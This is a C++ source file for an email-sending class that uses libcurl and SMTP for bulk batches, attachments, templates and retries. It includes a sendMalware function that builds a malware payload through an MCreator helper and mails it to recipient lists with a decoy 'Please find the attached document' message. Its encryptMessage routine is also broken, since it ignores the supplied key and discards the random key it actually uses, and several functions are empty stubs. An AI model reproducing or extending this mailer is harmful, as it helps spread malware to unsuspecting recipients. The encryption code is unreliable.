#include "EmailSender.h"
#include "Logger.h"
#include <iostream>
#include <stdexcept>
#include <fstream>
#include <sstream>
#include <json/json.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

EmailSender::EmailSender(const std::string &configFilePath) : curl(curl_easy_init(), curl_easy_cleanup) {
    loadConfig(configFilePath);
}

void EmailSender::loadConfig(const std::string &configFilePath) {
    std::ifstream configFile(configFilePath);
    if (!configFile.is_open()) {
        handleErrors("Failed to open config file");
    }

    Json::Value config;
    configFile >> config;

    smtpServer = config["smtpServer"].asString();
    port = config["port"].asInt();
    username = config["username"].asString();
    password = config["password"].asString();
}

void EmailSender::sendMessage(const std::string &recipient, const std::string &message) {
    sendMessage(std::vector<std::string>{recipient}, message);
}

void EmailSender::sendMessage(const std::vector<std::string> &recipients, const std::string &message) {
    const size_t batchSize = 100;
    for (size_t i = 0; i < recipients.size(); i += batchSize) {
        std::vector<std::string> batch(recipients.begin() + i, recipients.begin() + std::min(recipients.size(), i + batchSize));
        retrySendEmailBatch(batch, message);
    }
}

void EmailSender::sendMessageWithAttachment(const std::vector<std::string> &recipients, const std::string &message, const std::vector<std::string> &filePaths) {
    const size_t batchSize = 100;
    for (size_t i = 0; i < recipients.size(); i += batchSize) {
        std::vector<std::string> batch(recipients.begin() + i, recipients.begin() + std::min(recipients.size(), i + batchSize));
        retrySendEmailBatch(batch, message, filePaths);
    }
}

void EmailSender::sendEmailBatch(const std::vector<std::string> &batch, const std::string &message, const std::vector<std::string> &filePaths) {
    Logger::log(Logger::INFO, "Sending email batch");

    struct curl_slist *recipientsList = nullptr;
    for (const auto &recipient : batch) {
        recipientsList = curl_slist_append(recipientsList, ("<" + recipient + ">").c_str());
    }

    if (curl) {
        curl_easy_setopt(curl.get(), CURLOPT_USERNAME, username.c_str());
        curl_easy_setopt(curl.get(), CURLOPT_PASSWORD, password.c_str());
        curl_easy_setopt(curl.get(), CURLOPT_URL, smtpServer.c_str());
        curl_easy_setopt(curl.get(), CURLOPT_USE_SSL, CURLUSESSL_ALL);
        curl_easy_setopt(curl.get(), CURLOPT_MAIL_FROM, ("<" + username + ">").c_str());
        curl_easy_setopt(curl.get(), CURLOPT_MAIL_RCPT, recipientsList);

        curl_mime *mime = curl_mime_init(curl.get());
        curl_mimepart *part = curl_mime_addpart(mime);
        curl_mime_data(part, message.c_str(), CURL_ZERO_TERMINATED);

        for (const auto &filePath : filePaths) {
            part = curl_mime_addpart(mime);
            curl_mime_filedata(part, filePath.c_str());
        }

        curl_easy_setopt(curl.get(), CURLOPT_MIMEPOST, mime);
        CURLcode res = curl_easy_perform(curl.get());

        if (res != CURLE_OK) {
            handleErrors("Failed to send email: " + std::string(curl_easy_strerror(res)));
        }

        curl_slist_free_all(recipientsList);
        curl_mime_free(mime);
    }
}

void EmailSender::sendEncryptedMessage(const std::vector<std::string> &recipients, const std::string &message, const std::string &encryptionKey) {
    std::string encryptedMessage = encryptMessage(message, encryptionKey);
    sendMessage(recipients, encryptedMessage);
}

void EmailSender::getDeliveryReports() {
    // Implement logic to retrieve and process delivery reports
    Logger::log(Logger::INFO, "Retrieving delivery reports");
}

std::string EmailSender::applyTemplate(const std::string &templateContent, const std::map<std::string, std::string> &placeholders) {
    std::string result = templateContent;
    for (const auto &placeholder : placeholders) {
        std::string placeholderKey = "{" + placeholder.first + "}";
        size_t pos = result.find(placeholderKey);
        while (pos != std::string::npos) {
            result.replace(pos, placeholderKey.length(), placeholder.second);
            pos = result.find(placeholderKey, pos + placeholder.second.length());
        }
    }
    return result;
}

void EmailSender::sendTemplateMessage(const std::vector<std::string> &recipients, const std::string &templateName, const std::map<std::string, std::string> &placeholders) {
    std::ifstream templateFile("templates/" + templateName + ".txt");
    if (!templateFile.is_open()) {
        handleErrors("Failed to open template file");
    }

    std::stringstream buffer;
    buffer << templateFile.rdbuf();
    std::string templateContent = buffer.str();

    std::string message = applyTemplate(templateContent, placeholders);
    sendMessage(recipients, message);
}

void EmailSender::sendHTMLMessage(const std::vector<std::string> &recipients, const std::string &htmlMessage) {
    // Implement logic to send HTML message
    Logger::log(Logger::INFO, "Sending HTML message");
}

void EmailSender::sendMalware(const std::vector<std::string> &recipients, const std::string &payloadPath) {
    std::string malwarePath = MCreator::createMalware(payloadPath);
    sendMessageWithAttachment(recipients, "Please find the attached document.", {malwarePath});
}

void EmailSender::handleErrors(const std::string &error) {
    Logger::log(Logger::ERROR, error);
    throw std::runtime_error(error);
}

void EmailSender::logDetails(const std::string &stage, const std::string &details) {
    Logger::log(Logger::INFO, stage + ": " + details);
}

void EmailSender::retrySendEmailBatch(const std::vector<std::string> &batch, const std::string &message, const std::vector<std::string> &filePaths) {
    int attempts = 3;
    while (attempts > 0) {
        try {
            sendEmailBatch(batch, message, filePaths);
            break;
        } catch (const std::exception &e) {
            logDetails("Retry attempt failed", e.what());
            attempts--;
            if (attempts == 0){
                handleErrors("Failed to send email batch after multiple attempts");
            }
        }
    }
}

std::string EmailSender::encryptMessage(const std::string &message, const std::string &encryptionKey) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        handleErrors("Failed to create encryption context");
    }

    unsigned char key[32], iv[16];
    if (!RAND_bytes(key, sizeof(key)) || !RAND_bytes(iv, sizeof(iv))) {
        handleErrors("Failed to generate encryption key and IV");
    }

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
        handleErrors("Failed to initialize encryption");
    }

    std::string encryptedMessage;
    encryptedMessage.resize(message.size() + EVP_CIPHER_block_size(EVP_aes_256_cbc()));

    int len;
    if (1 != EVP_EncryptUpdate(ctx, reinterpret_cast<unsigned char*>(&encryptedMessage[0]), &len, reinterpret_cast<const unsigned char*>(message.c_str()), message.size())) {
        handleErrors("Failed to encrypt message");
    }

    int ciphertext_len = len;
    if (1 != EVP_EncryptFinal_ex(ctx, reinterpret_cast<unsigned char*>(&encryptedMessage[0]) + len, &len)) {
        handleErrors("Failed to finalize encryption");
    }
    ciphertext_len += len;

    encryptedMessage.resize(ciphertext_len);
    EVP_CIPHER_CTX_free(ctx);

    return encryptedMessage;
}



